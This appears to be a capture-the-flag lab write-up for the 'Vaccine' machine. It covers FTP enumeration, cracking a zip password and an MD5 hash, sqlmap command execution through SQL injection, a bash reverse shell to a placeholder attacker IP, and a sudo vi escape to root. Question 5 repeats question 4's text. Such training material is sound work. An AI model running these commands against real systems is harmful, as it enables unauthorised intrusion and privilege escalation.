>[!tldr] Vaccine is a very easy Linux machine that emphasizes enumeration and password cracking. Anonymous #FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application vulnerable to #SQL injection which leads to command execution and an initial shell as the postgres user. Finally, privilege escalation can be achieved by abusing misconfigured sudo permissions on vi.

# Guided Mode
---
1. `Besides SSH and HTTP, what other service is hosted on this box?`
	1. I start off with a `nmap` scan to get the other services
```shell
nmap -sT -p- 10.129.106.173
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- Flag #1 -> `FTP`

---
2. `This service can be configured to allow login with any password for specific username. What is that username?`
	1. There is a `anonymous` login that can be configured
	2. Flag #2 -> `anonymous`

---
3. `What is the name of the file downloaded over this service?`
	1. After logging in with "anonymous" there is only one file, a `backup.zip`. 
	2. Flag #3 -> `backup.zip`

---
4. `What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?`
	1. This one i know off the top of my head
	2. Flag #4 -> `zip2john`
	3. With this we make the hash into file called `zip-hash.txt` and then we use johnTheRipper the crack the hash 
		1. `echo 'hash' > zip-hash.txt`
		2. `john --wordlist=<wordlist> zip-hash.txt` 
		3. `john --show zip-hash.txt` -> `741852963` (Password for the zip file)

---
5. `What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?`
	1. Inside "Index.php" there is a md5 hash `2cb42f8734ea607eefed3b70af13bbd3` which we can decrypt with `hashcat` to get the password for admin!
	2. `hashcat -a 0 -m 0 '2cb42f8734ea607eefed3b70af13bbd3' ~/Tools/SecLists-2026.1/Passwords/Leaked-Databases/rockyou.txt` 
		1. Flag #4 -> `qwerty789`

---
6. `What option can be passed to sqlmap to try to get command execution via the sql injection?`
	1. Searching through the `sqlmap` manual for command execution I found the command `--os-shell` which gives you a interactive shell to the OS!
		1. `sqlmap -u "http://10.129.107.98/dashboard.php?search=test" --cookie="PHPSESSID=a4o21b6d12c1cmpecgqhkf39r7" --os-shell -o`
	2. Flag #5 -> `--os-shell`

---
7. `What program can the postgres user run as root using sudo?`
	1. `sudo -l` wasn't working with the shell we got with "sqlmap" so instead we will use the following to create a stable shell:
		1. SQLmap: `bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"`
		2. Attacker: `sudo nc -lvnp 4444`
		- Once the connection is established we will do the following for a fully interactive shell
			1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
			2. Press `CTRL+Z`
			3. `stty raw -echo`
			4. `fg`
			5. `export TERM=xterm`
	2. Now with the interactive shell we will look around further till we get `/var/www/html/dashboard.php`. Inside here we find the password `P@s5w0rd!` which allows us to run `sudo -l`
	3. Flag #7 -> `vi`

---
- User Flag
	- Inside there is one file `user.txt` and inside is the user flag
	- User Flag -> `[REDACTED_FLAG]`

---
- Root Flag
	- We now have the following credentials `postgres`:`P@s5w0rd!` which we will then connect to `ssh`
		- `sudo ssh postgres@10.129.107.98`

```shell
sudo -l
<SNIP>
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

- This means we can run "vi" as sudo but only to this specific file on this path

sudo bin/vi /etc/postgresql/11/main/pg_hba.conf
```
- Since we are now inside `vi` as "sudo" we need GTFObins for the steps to escape
	1. `:set shell=/bin/sh`
	2. `:shell`
- Now with a `whoami` I know that the user is now `root`. We `cd` back to home and inside we find `root.txt` which has the root flag
- Root Flag -> `[REDACTED_FLAG]`
